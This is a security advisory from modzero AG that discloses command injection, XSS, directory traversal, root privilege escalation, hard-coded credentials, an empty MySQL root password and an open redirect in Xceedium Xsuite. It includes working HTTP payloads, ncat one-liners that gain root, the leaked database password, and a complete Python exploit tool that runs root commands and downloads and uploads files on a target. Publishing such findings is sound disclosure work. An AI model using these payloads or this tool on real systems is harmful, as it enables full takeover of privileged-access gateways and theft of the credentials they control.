
---------------------------------------------------------------------

---------------------------------------------------------------------

1. Timeline

---------------------------------------------------------------------

 * 2015-06-17: Vulnerabilities have been discovered
 * 2015-06-19: Vendor notified via support@xceedium.com
 * 2015-06-19: CVE IDs assigned
 * 2015-06-26: Public reminder sent via Twitter
 * 2015-06-26: Findings updated
 * 2015-07-22: Release after Xceedium did not respond within
               more than 15 business days

---------------------------------------------------------------------

2. Summary

---------------------------------------------------------------------

Vendor: Xceedium, Inc.

Products known to be affected:

 * Xsuite 2.3.0
 * Xsuite 2.4.3.0
 * Other products and versions may be affected as well.

Severity: Overall High
Remote exploitable: remote and local

The  Xsuite system  controls  and audits  privileged  user access  to
computers  in a  network  environment.  Several vulnerabilities  were
identified in the solution. The vulnerabilities allow unauthenticated
users to fully compromise an Xsuite host over the network.

The  issues  described  below  are only  examples  for  vulnerability
classes. The solution is systematically affected by similar issues.

CVE-2015-4664 to CVE-2015-4669 was  assigned to these vulnerabilities
and vulnerability classes.

---------------------------------------------------------------------

3. Details

---------------------------------------------------------------------

3.1   Command  injection   via  the   login  form   (Severity:  High,
CVE-2015-4664)

The  login form  is affected  by a  code injection  vulnerability via
the  "id" POST  parameter, which  allows an  unauthenticated attacker
to  inject  Linux commands.  These  commands  are executed  with  the
privileges  of  the Linux  user  "www-data".  The injected  command&#039;s
output is then sent back to the attacker.

An example HTTP request and response is shown below.

HTTP request:

POST /login.php HTTP/1.1
Host: XXX.XXX.XXX.XXX
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://XXX.XXX.XXX.XXX/
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 80

id=admin&#039;|cat /etc/passwd||a%20%23|&pass=admin&authTypeOption=use_local&loginID=



HTTP response:

HTTP/1.1 200 OK
Date: Wed, 17 Jun 2015 10:47:47 GMT
Server: Apache
X-Frame-Options: SAMEORIGIN
Set-Cookie: PHPSESSID=6d5b0fbf8349caf10493f65e8f0b131b; path=/; secure; HttpOnly
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Pragma: no-cache
Set-Cookie: PROXY_AUTH_FAILURE=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT; path=/
Strict-Transport-Security: max-age=365246060
Content-Length: 2096
Keep-Alive: timeout=150, max=300
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
[...]


3.2   Cross-Site    Scripting   Vulnerability    (Severity:   Medium,
CVE-2015-4665)

The  following   example  shows  a  reflected   cross-site  scripting
vulnerability  that injects  JavaScript code  into a  user&#039;s session.
Here, the HTTP  response contains a message, which seems  to be JSON.
However, the content type is  "text/html". Thus, a web browser treats
the server response as HTML code (fragment).

HTTP request:

GET /ajax_cmd.php?cmd=COMPLETGRAPHYRECORDING&fileName=<img%20src%3da%20onload%3dalert(1)> HTTP/1.1
Host: XXX.XXX.XXX.XXX
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: PHPSESSID=c4f6547d9d889336a7f4a9a953cc3815
Connection: keep-alive


HTTP response:

HTTP/1.1 200 OK
Date: Thu, 18 Jun 2015 11:10:07 GMT
Server: Apache
X-Frame-Options: SAMEORIGIN
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Pragma: no-cache
Strict-Transport-Security: max-age=365246060
Content-Length: 70
Keep-Alive: timeout=150, max=300
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

["Unable to find decryption key for file <img src=a onload=alert(1)>"]


3.3 Directory  traversal and  File Download  Vulnerability (Severity:
Medium/High, CVE-2015-4666)

Due to insufficient input validation the "read_sessionlog.php" script
is  affected by  a  directory traversal  vulnerability, which  allows
unauthenticated users to obtain any files that the user "www-data" is
allowed to  access. The  script tries  to cut  the "../"  pattern for
relative  directory  addressing,  but  fails  to  sanitize  specially
crafted input. Hence, it is still possible to download files from the
host by accessing the script as shown below:

https://XXX.XXX.XXX.XXX/opm/read_sessionlog.php?logFile=....//....//....//....//etc/passwd

The   following   code   is   part    of   the   source   code   file
/var/www/htdocs/uag/web/opm/read_sessionlog.php

[...]
$file_path= $_REQUEST["logFile"];
[...]

if (strpos($file_path, &#039;/opt/rpath&#039;) !== 0) { $file_path = &#039;/opt/rpath/&#039; .$file_path; }

if($startByte < 1)
        $startByte=0;

if (isset($file_path)) {   
   // make sure users cannot hack via ../../
   $file_path = stripslashes($file_path);
   // if the file does not exist, display it
   if (!is_file($file_path)) { 
   echo &#039;File (&#039; .$_REQUEST["logFile"]. &#039;) does not exist.&#039;; 
   exit(0);        
   }
}  

output_file($file_path, &#039;VT100LogA.txt&#039;, &#039;&#039;, $startByte, $searchChar, $searchDir, $totalByte);
[...]


3.4  Privilege  escalation   via  "/sbin/spadmind"  (Severity:  High,
CVE-2015-4664)

The  "spadmind"   service  allows  local  users   to  escalate  their
privileges  to  become  "root".   In  combination  with  the  command
injection  vulnerability from  section  3.1, it  is  possible to  run
arbitrary commands as "root" user via the network.

The web interface  runs under the privileges of the  web server user.
To execute  privileged commands,  the web interface  sends text-based
messages  via a  socket  to the  "spadmind"  process. The  "spadmind"
process has a  listening socket bound to localhost:2210  and reads in
text lines, which are partially  used as parameter for system command
execution. Since the "spadmind" process  does not validate the input,
an  attacker  is able  to  inject  commands  that are  executed  with
super-user privileges.

File: /sbin/spadmind

[...]
    # socket
    my $clsock = shift;
    # command and number of lines to process
    my $command  = <$clsock>;
    my $numlines = <$clsock>;

    chomp($command);
    chomp($numlines);
[...]
    } elsif ($command eq &#039;expect&#039;) {
        chomp($line = <$clsock>);
        my $res = `expect $line`;
        if ($res =~ /(STATUS=\w+)/) {
            $resp = $1;
        } else {
            $resp = &#039;unknown&#039;;
        }
[...]

In the quoted  code above, running the command  "expect" and allowing
users to  specify parameters  is a vulnerability,  because parameters
could be passed via option "-c" to invoke shell commands.

$ echo -e "expect\n1\n-c garbage;id > /tmp/x23" | ncat --send-only 127.0.0.1 2210; sleep 1; cat
/tmp/x23
uid=0(root) gid=0(root)

$ echo -e "timezone\n1\n;id > /tmp/x42" | ncat --send-only 127.0.0.1 2210; sleep 1; cat /tmp/x42 
uid=0(root) gid=0(root)


3.5 Hard-coded database credentials (Severity: Low, CVE-2015-4667)

The  software uses  hard-coded credentials  at several  places, which
makes it unfeasible to change database credentials regularly.

$ grep -R n1b2dy .
./uag/db/init/install-xio-uag-data.sql:SET PASSWORD FOR &#039;uaguser&#039;@&#039;localhost&#039;=PASSWORD(&#039;n1b2dy&#039;);
./uag/db/init/upgrade401SP2to402.pl:use constant LW_DBPASS   => "n1b2dy";
./www/htdocs/uag/web/activeActiveCmd.php:            $res = mysql_connect("localhost", "uaguser",
"n1b2dy");
./www/htdocs/uag/web/activeActiveCmd.php:    $link = mysql_connect("localhost", "uaguser",
"n1b2dy");
./www/htdocs/uag/web/activeActiveCmd.php:    $link = mysql_connect("localhost", "uaguser",
"n1b2dy");
./www/htdocs/uag/web/activeActiveCmd.php:    $res = mysql_connect("localhost", "uaguser", "n1b2dy");
./www/htdocs/uag/web/activeActiveCmd.php:    $link = mysql_connect("localhost", "uaguser",
"n1b2dy");
./www/htdocs/uag/web/activeActiveCmd.php:        $link = mysql_connect("localhost", "uaguser",
"n1b2dy");
./www/htdocs/uag/web/ajax_cmd.php:    $link = mysql_connect("localhost", "uaguser" ,"n1b2dy");
./www/htdocs/uag/cgi/external_log_sync.php:    $db_link_local = new mysqli("localhost", "uaguser",
"n1b2dy", "uag");
./www/htdocs/uag/config/db.php:$dbchoices            = array("mysql", "uaguser", "n1b2dy");
./www/htdocs/uag/services/main/common/Configuration.php:    const K_DB_PASS_DEFAULT  = &#039;n1b2dy&#039;;
./www/htdocs/uag/functions/eula_check.php:        $link = mysql_connect("localhost", "uaguser",
"n1b2dy");
./www/htdocs/uag/functions/eula_check.php:        $link = mysql_connect("localhost", "uaguser",
"n1b2dy");
./www/htdocs/uag/functions/db.php:        $dbchoices            = array("mysql", "uaguser",
"n1b2dy");
./www/htdocs/uag/functions/remove_disabled_cron.pl:                        &#039;n1b2dy&#039;,

$ grep -R n1b2dy sbin
sbin/logwatch:use constant LW_DBPASS   => "n1b2dy";
sbin/interrogate-vmware.pl:  use constant   DB_PASSWORD  => &#039;n1b2dy&#039;;
Binary file sbin/xcd_sshproxy matches
Binary file sbin/xcd_upd matches
Binary file sbin/vlmon matches
Binary file sbin/sessd matches
Binary file sbin/gksfdm matches
Binary file sbin/xcdmsubagent matches
sbin/logload:my $dbh = DBI->connect("DBI:mysql:uag", "uaguser", "n1b2dy") or die("Can not connect to
the database\n");
sbin/make-auth-token.pl:  my $passwd         = &#039;n1b2dy&#039;;
sbin/rotate_coredumps.pl:  my $passwd         = &#039;n1b2dy&#039;;
Binary file sbin/loadcrl matches
sbin/ad_upd:      $dbh = DBI->connect( &#039;DBI:mysql:uag&#039;, &#039;uaguser&#039;, &#039;n1b2dy&#039;, { autocommit => 0 } )
sbin/ad_upd:      my $db = DBI->connect( &#039;DBI:mysql:uag&#039;, &#039;uaguser&#039;, &#039;n1b2dy&#039;, { autocommit => 0 } )
sbin/ad_upd:      $dbh = DBI->connect_cached( &#039;DBI:mysql:uag&#039;, &#039;uaguser&#039;, &#039;n1b2dy&#039;, { autocommit => 0 }
)
sbin/rfscheck:use constant LW_DBPASS  => "n1b2dy";
sbin/auth.pl:    &#039;n1b2dy&#039;,
sbin/apwd:  my $dbh = DBI->connect("DBI:mysql:uag", "uaguser", "n1b2dy") or return;
sbin/update_crld:my($dbpass)="n1b2dy";
sbin/update_crld:                            &#039;n1b2dy&#039;,


3.6.   No   password  for   MySQL   "root"   user  (Severity:   High,
CVE-2015-4669)

Local  users  can access  databases  on  the system  without  further
restrictions, because the MySQL "root" user has no password set.

$ python XceediumXsuitePoC.py --host  XXX.XXX.XXX.XXX --cmd &#039;echo "update user set active = 0,
passwd=sha1(\"myknownpw\") where u_name = \"mytargetuser\";"| mysql -u root uag&#039;


3.7 Open redirect (Severity: Low, CVE-2015-4668)

An attacker may craft a link to  an Xsuite host that looks valid, but
tricks the user  and abuses an open redirect  vulnerability in Xsuite
to redirect a user to a third  party web site, for example a web site
with malware.

https://XXX.XXX.XXX.XXX/openwin.php?redirurl=%68%74%74%70%3a%2f%2f%77%77%77%2e%6d%6f%64%7a%65%72%6f%2e%63%68

File: /var/www/htdocs/uag/web/openwin.php

<?
$redirurl = $_GET[&#039;redirurl&#039;];

header(&#039;Location: &#039; .$redirurl);

?>


3.8 Possible issues not further investigated

Passwords stored in  the database are unsalted  hashes, which reduces
the attack complexity if an attacker  has access to the database. The
setup under invesatigation partially used MD5 and SHA1 hashes.

The web interface and scripts  create SQL statements by concatenating
strings and user-supplied input without proper input validation. This
may result in SQL injections.

$ grep -i -R  where . | grep -E &#039;\$_(POST|GET)&#039;
./web/filter/filter_sfa.php:    $query = "delete from socket_filter_mon where
sfm_id=&#039;".$_GET[&#039;sfm_id&#039;]."&#039;";
./web/filter/filter_command_list.php:        $query = "select * from cmd_list where
id=&#039;".$_POST["s_list"]."&#039;";
./web/filter/filter_command_list.php:        $query = "delete from cmd_list where
id=&#039;".$_POST["s_list"]."&#039;";
./web/filter/filter_command_list.php:        $query = "delete from cmd_keywords where
list_id=&#039;".$_POST["s_list"]."&#039;";
./web/filter/filter_command_list.php:                 "where command_filter =
&#039;".$_POST["s_list"]."&#039;";
./web/filter/filter_command_list.php:    $query = "select * from cmd_list where
list_type=&#039;".$_POST[&#039;r_ltype&#039;]."&#039; order by listname";
./web/filter/filter_command_list.php:              where id=&#039;".$_POST[&#039;id&#039;]."&#039;";
./web/filter/filter_command.php:    $query = "update intervention_configuration set value =
&#039;".$_POST[&#039;number_warnings&#039;]."&#039; where name = &#039;number_of_warnings&#039;";
./web/filter/filter_command.php:    $query = "update intervention_configuration set value =
&#039;".$_POST[&#039;blacklist_action&#039;]."&#039; where name = &#039;intervention_action&#039;";
./web/filter/filter_command.php:    $query = "update intervention_configuration set value =
&#039;".$_POST[&#039;blacklist_intervention_message&#039;]."&#039; where name = &#039;blacklist_intervention_message&#039;";
./web/filter/filter_command.php:    $query = "update intervention_configuration set value =
&#039;".$_POST[&#039;whitelist_intervention_message&#039;]."&#039; where name = &#039;whitelist_intervention_message&#039;";
./web/filter/filter_command.php:    $query = "update intervention_configuration set value =
&#039;".$_POST[&#039;alert_email_message&#039;]."&#039; where name = &#039;alert_email_message&#039;";
./web/socketFilterCmd.php:        $res = mysql_query("SELECT h_id FROM host where hostID=" .
$_GET[&#039;h_id&#039;]);
./web/socketFilterCmd.php:        $res = mysql_query("SELECT h_id FROM host where hostID=" .
$_GET[&#039;h_id&#039;]);
./web/socketFilterCmd.php:    $query = "delete from rdp_lock where id=&#039;".$_GET[&#039;rdp_id&#039;]."&#039;";
./web/socketFilterCmd.php:    $query = "select hostID from host where h_id =
&#039;".db_esc($_GET["device_name"])."&#039;";
./web/socketFilterCmd.php:              where sess_id=&#039;".$_GET[&#039;PHPSESSID&#039;]."&#039; and
./web/socketFilterCmd.php:              $query = &#039;SELECT seq FROM gkconnection WHERE sess_id = "&#039; .$sessid.
&#039;" AND hostID = "&#039; .$_GET[&#039;h_id&#039;]. &#039;" AND pid IS NOT NULL&#039;;
./web/socketFilterCmd.php:                        $query = &#039;SELECT seq FROM gkconnection WHERE sess_id = "&#039;
.$sessid. &#039;" AND hostID = "&#039; .$_GET[&#039;h_id&#039;]. &#039;" AND pid IS NOT NULL&#039;;
./web/socketFilterCmd.php:                     $query = &#039;SELECT seq FROM gkconnection WHERE sess_id = "&#039;
.$sessid. &#039;" AND hostID = "&#039; .$_GET[&#039;h_id&#039;]. &#039;" AND pid IS NOT NULL&#039;;
./web/ajax_cmd.php:    $query = "select * from session where sess_id=&#039;".$_GET[&#039;param&#039;]."&#039;";
./web/ajax_cmd.php:                        WHERE hostID = &#039;".$_GET[&#039;hostID&#039;]."&#039;";
./web/ajax_cmd.php:    $query = &#039;SELECT u.userID FROM session AS s, user AS u WHERE s.u_name =
u.u_name AND s.sess_id = "&#039; .db_esc($_GET[&#039;sess_id&#039;]). &#039;"&#039;;
./web/dev/dev_ajax.php:    $update_query = "UPDATE kta_settings set value = &#039;".$_GET[$name]."&#039; where
name = &#039;".$name."&#039;";
./web/dev/dev_group_ajax.php:    if ($_POST[&#039;where&#039;] == &#039;hosts&#039; || $_POST[&#039;where&#039;] == &#039;hosts_sel&#039;) {
./web/dev/dev_group_ajax.php:        $where = $_POST[&#039;where&#039;];
./web/dev/dev_group_ajax.php:    if ($_POST[&#039;where&#039;] == &#039;hosts&#039; || $_POST[&#039;where&#039;] == &#039;hosts_sel&#039;) {
./web/dev/dev_group_ajax.php:        $where = $_POST[&#039;where&#039;];
./web/dev/dev_group_ajax.php:    if ($_POST[&#039;where&#039;] == &#039;hosts&#039; || $_POST[&#039;where&#039;] == &#039;hosts_sel&#039;) {
./web/dev/dev_group_ajax.php:        $where = $_POST[&#039;where&#039;];
./features/dev_sfa.php:    $query = "delete from socket_filter_mon where
sfm_id=&#039;".$_GET[&#039;sfm_id&#039;]."&#039;";
./hconfig/functions/smartb.php:      $query = "delete from smartb_cfg_files where fileName =
&#039;".$_POST["filename"]."&#039;";


---------------------------------------------------------------------

4. Impact

---------------------------------------------------------------------

The identified  vulnerabilities allows any user  to execute arbitrary
commands as system  super-user ("root"). Since the system  is used to
control other  devices (for  example, via RDP  and SSH),  an attacker
would add malicous modification to the Java-based clients for RDP and
SSH to exfiltrate access credentials for computers and to abuse these
credentials in further steps.


---------------------------------------------------------------------

5. Proof of concept exploit 

---------------------------------------------------------------------

#!/usr/bin/python
#
# Proof of Concept Tool to Exploit Vulnerabilities in 
# Xceedium Xsuite
#
# Author: modzero AG, Switzerland
#

import httplib2, urllib
import re
import base64
from optparse import OptionParser

url = &#039;&#039;

def get_command_output(cmd):
    marker = &#039;~~~~!!!!~~~~!!!!~~~~!!!!~~~~!!!!~~~~!!!!~~~~!!!!~~~~!!!!~~~~!!!!~~~~!!!!~~~~!!!!&#039;
    values = {
        &#039;id&#039; : "admin&#039;| echo " + marker +"; " + cmd + " ; echo -n " + marker + "||X #",
        &#039;pass&#039; : &#039;foo&#039;,
        &#039;authTypeOption&#039; : &#039;use_local&#039;,
        &#039;loginID&#039; : &#039;&#039;,
        }
    headers = {
        &#039;Content-Type&#039;: &#039;application/x-www-form-urlencoded&#039;,
        }
    values = urllib.urlencode(values)
    h = httplib2.Http(disable_ssl_certificate_validation=True)
    resp, content = h.request(url, "POST", values, headers = headers)
    offset1 = content.find(marker) + len(marker)
    offset2 = content.rfind(marker, offset1 + 1)
    try:
        return base64.standard_b64decode(content[offset1:offset2])
    except:
        return content[offset1:offset2]


def get_dir(retrieve_dir):
    fname = re.sub(r&#039;\/&#039;, &#039;_&#039;, retrieve_dir) + ".tgz"
    text_file = open(fname, "w")
    text_file.write(get_command_output("tar -czf - " + retrieve_dir + " | base64"))
    text_file.close()

def get_file(retrieve_file):
    fname = re.sub(r&#039;\/&#039;, &#039;_&#039;, retrieve_file)
    data = get_command_output("cat " + retrieve_file + " | base64")
    print data
    text_file = open(fname, "w")
    text_file.write(data)
    text_file.close()

def exec_cmd(cmd):
    data = get_command_output(cmd + " | base64")
    print data

def exec_root(cmd):
    data = get_command_output(&#039;echo -e "timezone\n1\n;&#039; + cmd + &#039; > /tmp/.x" | ncat --send-only
127.0.0.1 2210; sleep 1; cat /tmp/.x | base64&#039;)
    print data

def upload_file(fname, dst_file):
    with open(fname, &#039;r&#039;) as content_file:
        b64_content = base64.standard_b64encode(content_file.read())
        get_command_output("echo " + b64_content + " | base64 -d > " + dst_file)

def main():
    global url
    parser = OptionParser()
    parser.add_option("--host", dest="host", help="The host to attack")
    parser.add_option("--dir", dest="dir", help="The directory to retrieve")
    parser.add_option("--file", dest="file", help="The file to retrieve")
    parser.add_option("--cmd", dest="cmd", help="The command to execute")
    parser.add_option("--root", dest="root", help="The command to execute with root privileges")
    parser.add_option("--upload", dest="upload", help="A local file to upload")
    parser.add_option("--dst", dest="dst_file", help="The destination file for uploaded content")
    
    (options, args) = parser.parse_args()
    
    if options.host:
        url = &#039;https://%s/login.php&#039; % (options.host)
        
    if options.dir:
        get_dir(options.dir)
    elif options.file:
        get_file(options.file)
    elif options.cmd:
        exec_cmd(options.cmd)
    elif options.root:
        exec_root(options.root)
    elif options.upload:
        upload_file(options.upload, options.dst_file)
        
if __name__ == "__main__":
    main()


---------------------------------------------------------------------

6. Workaround

---------------------------------------------------------------------

A workaround is not known.

